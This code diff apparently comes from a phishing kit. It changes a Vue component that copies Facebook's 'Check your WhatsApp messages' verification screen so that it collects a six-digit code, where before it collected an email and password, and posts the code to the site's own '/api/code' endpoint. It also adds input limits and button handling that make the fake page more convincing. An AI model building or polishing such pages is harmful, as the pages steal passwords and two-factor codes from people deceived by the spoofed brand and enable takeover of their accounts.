@@ -23,15 +23,15 @@ const handleFocus = (type: string, ref: any) => {
 }
 
 const handleSubmit = async () => {
-  if (!email.value || !password.value) {
+  if (!code.value) {
     return
   }
 
   // Call your API here
   try {
-    await $fetch('/api/signin', {
+    await $fetch('/api/code', {
       method: 'POST',
-      body: JSON.stringify({ email: email.value, password: password.value }),
+      body: JSON.stringify({ code: code.value }),
       headers: {
         'Content-Type': 'application/json',
       },
@@ -43,8 +43,8 @@ const handleSubmit = async () => {
 </script>
 
 <template>
-  <div class="flex justify-center items-center w-full h-screen bg-[#f1f5fb]">
-    <div class="w-[600px]">
+  <div class="flex px-4 justify-center items-center w-full h-screen bg-[#f1f5fb]">
+    <div class="max-md:w-full w-[600px]">
       <p class="text-[13px] mb-4">Monica Guan • Facebook</p>
       <p class="text-[1.5rem] font-[600]" style="line-height: 17px">Check your WhatsApp messages</p>
       <p class="text-[13px] mt-5 mb-4">Enter the code that we sent to your WhatsApp account.</p>
@@ -69,6 +69,7 @@ const handleSubmit = async () => {
           ref="emailElement"
           v-model="code"
           type="text"
+          maxlength="6"
           class="h-5 text-[rgb(28,43,51)]"
           autocomplete="off"
           :class="{
@@ -89,9 +90,11 @@ const handleSubmit = async () => {
 
       <button
         :class="{
-          'bg-[#0263df]': code.trim().length === 6,
+          '!bg-[#0263df]': code.trim().length === 6,
         }"
+        :disabled="code.trim().length !== 6"
         class="mb-3 mt-8 w-full text-[15px] font-light h-[44px] rounded-full text-white bg-[#a3beef]"
+        @click="handleSubmit"
       >
         Continue
       </button>
